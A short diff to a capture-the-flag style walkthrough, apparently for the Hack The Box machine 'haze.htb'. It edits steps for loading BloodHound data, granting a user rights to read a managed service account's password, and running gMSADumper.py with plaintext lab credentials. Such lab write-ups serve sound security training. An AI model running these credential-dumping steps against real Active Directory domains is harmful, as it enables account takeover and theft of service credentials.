@@ -200,8 +200,7 @@ issue.
 
 **-** Import **20250430182035_bloodhound.zip into** GUI
 
-Start Bloodhound: Login with credentials (previously configured, see
-STEPS in CERTIFIED VM)
+Start Bloodhound: Login with credentials
 
 **User:** neo4j **Password:** as163452
 
@@ -355,7 +354,7 @@ owner SUPPORT_SERVICES Haze-IT-Backup\$**
 \"Haze-IT-Backup\$\" -PrincipalsAllowedToRetrieveManagedPassword
 \"mark.adams\"**
 
-**??RUN in Kali VM: python gMSADumper.py -u \'mark.adams\' -p
+**RUN in Kali VM: python gMSADumper.py -u \'mark.adams\' -p
 \'Ld@p_Auth_Sp1unk@2k24\' -d haze.htb**
 
 **RUN loggedin with POWERSHELL: Get-ADServiceAccount -Identity
